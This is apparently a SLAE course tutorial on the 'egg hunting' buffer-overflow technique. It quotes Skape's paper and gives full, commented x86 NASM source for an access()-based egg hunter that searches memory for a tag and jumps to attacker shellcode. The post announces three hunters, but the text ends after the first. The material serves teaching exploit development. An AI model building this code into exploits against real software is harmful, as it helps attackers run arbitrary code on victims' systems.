# Egg Hunting #

Definition. Following the [fantastic document](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf) created by Skape:

*`It’s primarily useful for exploitation. Some exploit vectors only allowthe attacker a very small amount of data to use when accomplishing their bufferoverflow. For instance, the Internet Explorer object type vulnerability andthe Subversion date parsing vulnerability are both examples of overflows thatallow for a limited amount of data to be written and used as a payload at adeterministic location. However, both exploits allow for the attacker to placea large payload somewhere else in the address space of the process, thoughthe location that it is stored at is indeterminate.  In the case of the objecttype vulnerability, an attacker can place their egg somewhere else in the HTMLfile, which in the end is translated into a heap allocated buffer that stores thecontents of the page being processed.`*

In simple words, the Egg Hunting technique allows us to create a relatively short shellcode (~ 30), whose task is to search the memory (stack, heap, ...) in search of the original, long shellcode, which in normal conditions could not be used due to space restriction.

To this end, so-called tags are used, which is a string that will "point" to the beginning of the actual shellcode that immediately follows them.

Due to the speed of today's processors, the memory search process is rapid and almost imperceptible during exploitation.

In this article, I will try to describe the process of creating three different Egg Hunters listed in the Skapes document, namely:
- access #1
- access #2
- sigaction

### Access #1 ###

The simplest idea of egg hunting can be understood on a practical example. We'll start with the first method described by Skape using access () system call. It is used to verify whether a given process has permissions in the system to access the file on the filesystem.
As arguments, he takes only one value (the second in our case can be zero):
```sh
int (access const char * pathname, int mode);
```
It is also very important that the method does not perform any write operations, which could be very dangerous when searching the entire memory for the tag.

Here is the full Egg Hunter code, with explanatory comments.
```nasm
; Filename: 	egghunting.nasm
; Author:	Jakub Heba
; Purpose:	SLAE Course & Exam 

global _start			

section .text
_start:

	mov ebx, 0x50905090		; Our TAG

	xor ecx, ecx			; ECX cleaning
	mul ecx				; EAX and EDX cleaning

loop:
	or dx, 0xfff			; 4096 bytes for iteration

iteration:
	inc edx				; EDX is incremented

	pusha				; Pushing all general purpose registers on the stack, to prevent eg. EAX value from changing during syscall
	lea ebx, [edx+0x4]		; Putting EDX + 4 bytes into the EBX, for preparing to the syscall (EBX is the first argument)

	mov al, 0x21			; syscall defining (#define __NR_access 33)
	int 0x80			; syscall execution, return value stored in EAX
	
	cmp al, 0xf2			; comparing the return value with 0xf2, which means, that if syscall returns an EFAULT error, Zero Flag is set
	
	popa				; popping all general purpose registers from the stack
	
	jz loop				; If comparing returns True (EFAULT error, ZF set), next 4096 bytes of memory, and next iteration

	; Here, we are looking for the TAG in this part of memory	
	cmp [edx], ebx			; Check, that EDX points to our TAG value, and set ZF, if true
	
	jnz iteration			; If ZF is not set, JMP to the INC instruction and repeat the process
	
	cmp [edx+0x4], ebx		; Check, that we have our second TAG value, to prevent from mistakes
						
	jnz iteration			; If ZF is not set, JMP to the INC instruction and repeat the process, otherwise, eggs are found
	
	jmp edx				; JMP directly to the right Shellcode
```
